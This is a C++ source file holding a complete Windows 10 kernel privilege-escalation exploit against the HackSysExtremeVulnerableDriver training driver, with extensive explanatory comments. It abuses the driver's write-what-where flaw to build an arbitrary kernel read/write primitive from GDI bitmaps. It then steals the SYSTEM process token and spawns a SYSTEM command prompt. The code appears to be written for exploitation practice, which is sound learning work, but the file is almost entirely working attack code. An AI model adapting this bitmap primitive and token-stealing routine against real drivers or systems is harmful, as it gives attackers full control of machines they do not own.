#include "stdafx.h"
#include "windows.h"

// Define expected parameters, their types, and the return value type (aka NTSTATUS) for NtQueryInformationProcess
typedef NTSTATUS(WINAPI *_NtQueryInformationProcess)(
	HANDLE ProcessHandle,
	DWORD ProcessInformationClass,
	PVOID64 ProcessInformation,
	ULONG64 ProcessInformationLength,
	PULONG64 ReturnLength
);

typedef struct _PROCESS_BASIC_INFORMATION {
	int * ExitStatus;
	int * PebBaseAddress;
	int * AffinityMask;
	int * BasePriority; // Forgot this one line. 2 weeks worth of work later, figure out it should be here. FML.
	UINT64 * UniqueProcessId;
	int * InheritedFromUniqueProcessId;

} PROCESS_BASIC_INFORMATION, *PPROCESS_BASIC_INFORMATION;

// Need to define NtQuerySystemInformation as a function pointer hence the WINAPI *<function name> part. Also define expected parameters and their type and return value type as NTSTATUS.
typedef NTSTATUS(WINAPI *_NtQuerySystemInformation)(
	DWORD SystemInformationClass,
	PVOID64 SystemInformation,
	ULONG64 SystemInformationLength,
	PULONG64 ReturnLength
);

/*
	Thanks to http://alter.org.ua/docs/nt_kernel/procaddr/#SYSTEM_MODULE_INFORMATION for the following info.
	Taken from earlier exploit I wrote for HEVD ironically enough :)
*/
typedef struct _SYSTEM_MODULE_INFORMATION_ENTRY {
	ULONG Reserved[4];
	PVOID Base;
	ULONG ImageSize;
	ULONG Flags;
	USHORT Index; 
	USHORT NameLength;
	USHORT LoadCount;
	USHORT PathLength;
	CHAR ImageName[256];
} SYSTEM_MODULE_INFORMATION_ENTRY, *PSYSTEM_MODULE_INFORMATION_ENTRY;

typedef struct _SYSTEM_MODULE_INFORMATION
{
	ULONG Count;
	SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

DWORD64 BitmapArbitraryRead(HBITMAP managerBitmap, HBITMAP workerBitmap, DWORD64 addressToRead) {
	// Allocate some memory to contain the results returned from GetBitmapBits.
	LPVOID results = VirtualAlloc(0, 8, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	// Use the SetBitmapBits on the manager bitmap to overwrite the pvScan0 field of the worker bitmap with the address of what we want to read, therefore
	// making the worker bitmap think it is located at this address in memory.
	SetBitmapBits(managerBitmap, 8, (VOID *)(&addressToRead));

	// Read the 8 bits contained at the memory address we want to read
	if (GetBitmapBits(workerBitmap, 8, results) == 0) {
		printf("Unable to read bytes using GetBitmapBits :( Windows makes this panda sad...\r\n");
		return -1;
	}

	VirtualFree(results, 8, MEM_RELEASE); // Thanks to MDSN documenation for info on this. Need to be clean so free memory after we have used it :)
	return *((DWORD64 *)results); // Cast results in to a pointer to a DWORD64 value using (DWORD64 *)results and then dereference this result using * to get the DWORD64 value. Finally, return this value back to caller.
}

DWORD64 BitmapArbitraryWrite(HBITMAP managerBitmap, HBITMAP workerBitmap, DWORD64 addressToWrite, DWORD64 valueToWrite) {
	// Use the SetBitmapBits on the manager bitmap to overwrite the pvScan0 field of the worker bitmap with the address of what we want to write, therefore
	// making the worker bitmap think it is located at this address in memory.
	SetBitmapBits(managerBitmap, 8, (VOID *)(&addressToWrite));

	// Set the 8 bits contained at the memory address we want to write to to the value provided
	if (SetBitmapBits(workerBitmap, 8, (VOID *)(&valueToWrite)) == 0) {
		printf("Unable to set bytes using SetBitmapBits :( Windows makes this panda sad...\r\n");
		return -1;
	}
}

int main()
{
	// Define the offsets for various fields within the EPROCESS and PEB structures
	DWORD64 ActiveProcessLinksOffset = 0x2F0;
	DWORD64 TokenOffset = 0x358;
	DWORD64 UniqueProcessIdOffset = 0x2E8;
	DWORD64 GdiSharedHandleTableOffset = 0xF8;

	printf("HEVD Aribtrary Overwrite Exploit using Bitmap leak patched Windows 10 Build 1607\r\n");
	printf("Exploit written by tekwizz123 with lots of help from FuzzySecurity\r\n");
	printf("=====================================================================\r\n\r\n");
	printf("Obtaining PEB address via NtQueryInformationProcess\r\nSupposively undocumented but the book 'Windows NT/2000 Native API Reference' covers this well.\r\n\r\n");
	
	HMODULE hModule = LoadLibraryW(L"ntdll.dll"); // Obtain handle to NTDLL.DLL
	_NtQueryInformationProcess NtQueryInformationProcess = (_NtQueryInformationProcess)GetProcAddress(hModule, "NtQueryInformationProcess"); // Then use this handle to get the address of NtQueryInformationProcess and save this to a variable using the definition for a function pointer we define in _NtQueryInformationProcess
	/*	
		Debugging code in case you want to see the address of NtQueryInformationProcess for verification purposes:
		
		printf("Result: %llx\r\n", NtQueryInformationProcess);
	
	*/

	// Set up variables we will use in a sec.
	PROCESS_BASIC_INFORMATION processInfoClass = { 0 };
	ULONG64 processInfoLength = 0;
	int result = 0;
	
	/* This code is here as I found a guide to calling NtQueryInformation which showed how to do this using a call to OpenProcess to obtain
	a handle to the current process which we can then pass to NtQueryInformationProcess to obtain the info we want. Probably are other ways to do this though.
	*/
	HANDLE currentProcessHandle = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, GetCurrentProcessId());

	// Class 0 is ProcessBasicInformation, as can be seen in Windows NT/2000 Native API Reference :) 
	// Use this call to obtain a PROCESS_BASIC_INFORMATION structure for current process, which will contain the PEB base address.
	result = NtQueryInformationProcess(currentProcessHandle, 0, &processInfoClass, sizeof(PROCESS_BASIC_INFORMATION), &processInfoLength); 
	if (result != 0) {
		printf("An error occured when calling NtQueryInformationProcess!\r\n");
		printf("The error code is: 0x%x\r\n", result);
		return 1;
	}
	printf("Process ID: %i\r\n", processInfoClass.UniqueProcessId);
	printf("PEB Base Address: 0x%llx\r\n", processInfoClass.PebBaseAddress);
	DWORD64 PEBBaseAddress = (DWORD64) processInfoClass.PebBaseAddress;
	
	// Use our defined offset to find out where the GdiSharedHandleTable is so we can go and leak the kernel address of the Bitmaps we will create.
	DWORD64 GdiSharedHandleTablePtr = (PEBBaseAddress + GdiSharedHandleTableOffset); 
	DWORD64 GdiSharedHandleTableAddress = *((DWORD64 *)GdiSharedHandleTablePtr); // Cast GdiSharedHandleTablePtr to a pointer to a DWORD64 value, then dereference it to get its contents.
	printf("GdiSharedHandleTable Address: 0x%llx\r\n\r\n", GdiSharedHandleTableAddress);

	/* Okay at this point we have a pointer to the base of the GdiSharedHandleTable however there are no entries as
	this process presently doesn't have any GDI handles. Lets make our bitmaps so we have some entries in this table
	and can retrieve the bitmaps kernel addresses.*/
	printf("Creating bitmaps!\r\n\r\n");
	
	printf("Creating manager bitmap!\r\n");

	// Calculation is 0x64 * 0x64 * 4 as we are creating a 0x64 by 0x64 byte array and a byte is 4 bits in 
	// length, hence 0x64 * 0x64 * 4 to get the total size of the bitmap we create.
	DWORD64 * bitBuffer = (DWORD64 *)VirtualAlloc(0, 0x64 * 0x64 * 4, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); 
	memset(bitBuffer, 0, 0x64 * 0x64 * 4); // Clear out contents of buffer.
	HBITMAP managerBitmap = CreateBitmap(0x64, 0x64, 1, 32, bitBuffer);
	printf("Manager bitmap handle = 0x%x\r\n", managerBitmap);
	DWORD64 offset = ((DWORD64)managerBitmap & 0xFFFF); // Lower 16 bits contain the offset, or number of GDI_CELL structues, into GdiSharedHandleTable where our bitmap entry is located, so AND'ing with 0xFFFF will clear all bits except for the last 16.
	printf("Offset into handle table = 0x%x\r\n", offset);
	DWORD64 * managerHandleTableEntry = (DWORD64 *)(GdiSharedHandleTableAddress + (offset * 0x18)); /* Times offset by 0x18 as this is the size of a GDICELL structure on x64. This was documented in "Abusing GDI for ring0 exploit primitives" by Nicolas A. Economou and Diego Juarez
																										When calculation is done we have the pointer to the managerTableEntry aka the GDI_CELL entry corresponding to the manager bitmap we created (not the worker bitmap as we will do in a sec).
																									*/
	printf("Manager handle table entry address = 0x%llx\r\n", managerHandleTableEntry);
	DWORD64 managerKernelAddress = *(managerHandleTableEntry); // PKernelAddress is first entry in the GDICELL struct so lets reference the current managerHandleTableEntry address to obtain the contents of memory stored at this location, aka PKernelAddress.
	printf("Manager bitmap kernel address = 0x%llx\r\n\r\n", managerKernelAddress);
	

	// Same process as before, not going to explain it again as steps are pretty much the exact same.
	printf("Creating worker bitmap!\r\n");
	DWORD64 * bitBuffer2 = (DWORD64 *)VirtualAlloc(0, 0x64 * 0x64 * 4, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	memset(bitBuffer2, 0, 0x64 * 0x64 * 4);
	HBITMAP workerBitmap = CreateBitmap(0x64, 0x64, 1, 32, bitBuffer2);
	printf("Worker bitmap handle = 0x%x\r\n", workerBitmap);
	DWORD64 offset2 = ((DWORD64)workerBitmap & 0xFFFF);
	printf("Offset into handle table = 0x%x\r\n", offset2);
	DWORD64 * workerHandleTableEntry = (DWORD64 *)(GdiSharedHandleTableAddress + (offset2 * 0x18));
	printf("Worker handle table entry address = 0x%llx\r\n", workerHandleTableEntry);
	DWORD64 workerKernelAddress = *(workerHandleTableEntry);
	printf("Worker bitmap kernel address = 0x%llx\r\n\r\n", workerKernelAddress);

	// Needed to cast the workerKernelAddress and managerKernelAddress to DWORD64 else calculations got messed up.
	// Cast back to DWORD64 * afterwards because I felt like it....not really needed tbh.
	DWORD64 * workerPvScan0Address = (DWORD64 *) ((DWORD64)workerKernelAddress + 0x18 + 0x38); // 0x18 for the _BASEOBJECT header on x64 and 0x38 for the 7 fields before the pvScan0 field we need to skip over (size on x64 though, on x86 it is 0x20).
	DWORD64 * managerPvScan0Address = (DWORD64 *)((DWORD64)managerKernelAddress + 0x18 + 0x38); // 0x18 for the _BASEOBJECT header on x64 and 0x38 for the 7 fields before the pvScan0 field we need to skip over (size on x64 though, on x86 it is 0x20).

	printf("Manager pvScan0 address: %llx\r\n", managerPvScan0Address);
	printf("Worker pvScan0 address: %llx\r\n\r\n", workerPvScan0Address);

	// Okay we have the information. Lets overwrite the manager's pvScan0 address with the address of the worker's pvScan0 field.
	
	// Open up a handle to the driver and error out if we can't get it working.
	printf("Exploiting Write-What-Where vulnerability using Bitmaps\r\n");
	HANDLE deviceHandle = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);
	if (deviceHandle == INVALID_HANDLE_VALUE) {
	printf("We were not able to get a handle to the device!\r\n");
	return 1;
	}

	// Set up the input buffer and the bytesReturned counter
	byte inBuffer[16] = { 0 };
	DWORD bytesReturned = 0;

	// Allocate memory for the whatPointer.
	LPVOID whatPointerAddr = VirtualAlloc(0, 8, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	memcpy(whatPointerAddr, &workerPvScan0Address, 8); /* Copy address of the worker bitmap's pvScan0 address into the whatPointer 
													   memory location so our write will reference the memory located at whatPointer, 
													   find the address of the pvScan0 field of the worker bitmap, and write that where 
													   we want. */
	memcpy(inBuffer, &whatPointerAddr, 8); // What pointer
	memcpy(inBuffer+8, &managerPvScan0Address, 8); /* Where address. We set this to the manager's pvScan0 field as we want to set this field
												   to be the same address as the pvScan0 field of the worker. This way we can use 
												   SetBitMapBits on the manager to change where the worker is located in memory, 
												   essentially positioning it anywhere in memory and achieving arbitrary kernel level R+W. */

	// Trigger arbitrary write to set manager bitmap to point to pvScan0 field of worker bitmap so we can control where the worker bitmap thinks it is located in memory.
	DeviceIoControl(deviceHandle, 0x22200B, &inBuffer, sizeof(inBuffer), NULL, 0, &bytesReturned, (LPOVERLAPPED)NULL);

	// Okay so now we have arbitrary read write in memory via GDI bitmaps. Lets get started :)
	// First we need to find the address of the SYSTEM EPROCESS entry so we can steal the token from there.
	// To do this we need NtQuerySystemInformation so lets get the address of this function first.
	_NtQuerySystemInformation NtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(hModule, "NtQuerySystemInformation");

	// Allocate memory for the SYSTEM_MODULE_INFORMATION struct that will be returned.
	PVOID64 pSystemInformationStorage = VirtualAlloc(0, sizeof(SYSTEM_MODULE_INFORMATION), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	ULONG64 returnLength = 0;

	// Use 11, or the class SystemModuleInformation, to return a SYSTEM_MODULE_INFORMATION structure into pSystemInformationStorage.
	NtQuerySystemInformation(11, pSystemInformationStorage, sizeof(SYSTEM_MODULE_INFORMATION), &returnLength);
	
	PSYSTEM_MODULE_INFORMATION systemModuleInfo = (PSYSTEM_MODULE_INFORMATION) pSystemInformationStorage;/* Cast the memory returned so we 
																										 can access its elements appropriately */
	SYSTEM_MODULE_INFORMATION_ENTRY moduleInformationEntry = systemModuleInfo->Module[0]; // Access the only module entry in the module array, Module[0]. Could also write this as just Module I think but hey I'd rather be accurate.
	DWORD64 kernelBase = (DWORD64)moduleInformationEntry.Base; // From Module[0], now saved in moduleInformationEntry, get the modules base address. This will be the base address of the kernel.
	printf("The kernel base address is: %llx\r\n", kernelBase);
	CHAR * imageName = (moduleInformationEntry.ImageName + moduleInformationEntry.PathLength); // Add PathLength to skip over \\SystemRoot\\system32\\ or similar stuff :) After adding this value to ImageName, we should get the name of the kernel image.
	HMODULE kernelHandle = LoadLibraryA(imageName); // Use the image name (aka DLL name) we obtained from earlier to obtain a handle to the DLL using LoadLibraryA.
	FARPROC PsInitialSystemProcess = GetProcAddress(kernelHandle, "PsInitialSystemProcess"); // From the handle, use GetProcAddress to find out where the address of PsInitialSystemProcess is, aka the address of a pointer to the SYSTEM process's EPROCESS structure.
	DWORD64 SystemEProcessPointer = (((DWORD64)PsInitialSystemProcess - (DWORD64)kernelHandle) + kernelBase); /* PsInitialSystemProcess - kernelHandle to get offset into DLL where the PsInitialSystemProcess function/variable is located, 
																											  then add base address of kernel to find where it is located relative to the kernel loaded
																											  at boot rather than the DLL we loaded just now. */

	

	// Saving SYSTEM EPROCESS structure address
	DWORD64 SystemEProcessAddress = BitmapArbitraryRead(managerBitmap, workerBitmap, SystemEProcessPointer); /* Pass in the address of PsInitialSystemProcess to our BitmapArbitraryRead function, 
																											 which will utilise the manager and worker bitmaps to read the address located at PsInitialSystemProcess
																											 map this into userland memory, read the contents from this userland memory, and return this value, which
																											 is then saved into SystemEProcessAddress. */

	// Check if we could read the value successfully. If we failed, BitmapArbitraryRead will return -1, hence this check.
	if (SystemEProcessAddress == -1) {
		printf("Couldn't read the address at PsInitalSystemProcess to find the SYSTEM processes's EPROCESS structure\r\n");
		return -1;
	}
	printf("Results content: %llx\r\n", SystemEProcessAddress);

	DWORD64 SystemEProcessTokenPointer = SystemEProcessAddress + TokenOffset; // Add TokenOffset to get address of the TOKEN field of the SYSTEM EPROCESS structure.
	DWORD64 systemEProcessToken = BitmapArbitraryRead(managerBitmap, workerBitmap, SystemEProcessTokenPointer); // Read the value of the SYSTEM EPROCESS's TOKEN field so we know what to replace our process's TOKEN with.
	if (systemEProcessToken == -1) {
		printf("Couldn't read the TOKEN field from the SYSTEM's EPROCESS structure\r\n");
		return -1;
	}
	printf("System EPROCESS TOKEN: %llx\r\n\r\n", systemEProcessToken);

	DWORD CurrentPID = GetCurrentProcessId(); // Get our current process's PID as we will need this for later comparisons.
	printf("Traversing ActiveProcessLinks to find current process's EPROCESS structure.\r\n");

	/* Read content of the SYSTEM process's ActiveProcessLinks field. As the first entry is the FLINK pointer,
	this will return the next ActiveProcessLinks links entry. We then minus this value by UniqueProcessIdOffset
	as this is the offset to the beginning of the field before ActiveProcessLinks, aka UniqueProcessId.
	Finally subtract by 8, aka the size of UniqueProcessId itself, to get the address of the beginning of the
	EPROCESS structure. This is a HECK of a lot easier to see using http://terminus.rewolf.pl/terminus/structures/ntdll/_EPROCESS_x64.html
	though and I'd highly recommend you take a look at it to see these calculations and verify what I am talking about for yourself. 
	*/
	DWORD64 NextProcessEProcessAddress = BitmapArbitraryRead(managerBitmap, workerBitmap, (((DWORD64)SystemEProcessAddress) + ((DWORD64)ActiveProcessLinksOffset))) - UniqueProcessIdOffset - 8; 
	
	// Initialize the PID process token variable to 0.
	DWORD64 CurrentPIDProcessToken = 0;

	// Loop to find the current process's EPROCESS structure. 
	while (1) {
		// Get PID of the current process we are examining in the ActiveProcessLinks chain.
		DWORD64 NextProcessPID = BitmapArbitraryRead(managerBitmap, workerBitmap, ((DWORD64)NextProcessEProcessAddress + UniqueProcessIdOffset));
		if (NextProcessPID == CurrentPID) { // Check if is our current process or not.
			CurrentPIDProcessToken = BitmapArbitraryRead(managerBitmap, workerBitmap, ((DWORD64)NextProcessEProcessAddress + TokenOffset)); /* If it is, add the value of TokenOffset to current EPROCESS address to get address of TOKEN 
																																			field, then read this to get value of token.  This is not needed for the exploit to work, more for information. */
			printf("Current process token: %llx\r\n", CurrentPIDProcessToken);
			break;
		}
		NextProcessEProcessAddress = BitmapArbitraryRead(managerBitmap, workerBitmap, ((DWORD64)NextProcessEProcessAddress + ActiveProcessLinksOffset)) - UniqueProcessIdOffset - 8; /* Okay, this is not our process, so use the same caluation as explained earlier but using 
																																													 NextProcessEProcessAddress to obtain the EPROCESS address of the next process in the ActiveProcessLinks list. */
	}

	printf("Changing current process's EPROCESS->TOKEN field to be that of the SYSTEM process's EPROCESS->TOKEN field\r\n");
	BitmapArbitraryWrite(managerBitmap, workerBitmap, ((DWORD64)NextProcessEProcessAddress + TokenOffset), systemEProcessToken); /* Use the BitmapArbitraryWrite primative to set the address of the worker bitmap to 
																																 ((DWORD64)NextProcessEProcessAddress + TokenOffset), aka the address of the TOKEN field
																																 of our current process, and then write systemEProcessToken, or the SYSTEM process's TOKEN value, 
																																 to this address, giving us full SYSTEM level permissions. */

	// Spawn SYSTEM level cmd prompt. w00t w00t :)
	printf("Creating SYSTEM level CMD.EXE prompt\r\n");
	PROCESS_INFORMATION pi;
	ZeroMemory(&pi, sizeof(pi));
	STARTUPINFOA si;
	ZeroMemory(&si, sizeof(si));
	CreateProcessA("C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, 0, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi); // Spawn cmd.exe with SYSTEM privs as we have now stolen the SYSTEM token.
	
	// ADD THIS IF YOU WANT TO DEBUG THINGS!
	//Sleep(8000);
	//DebugBreak();
}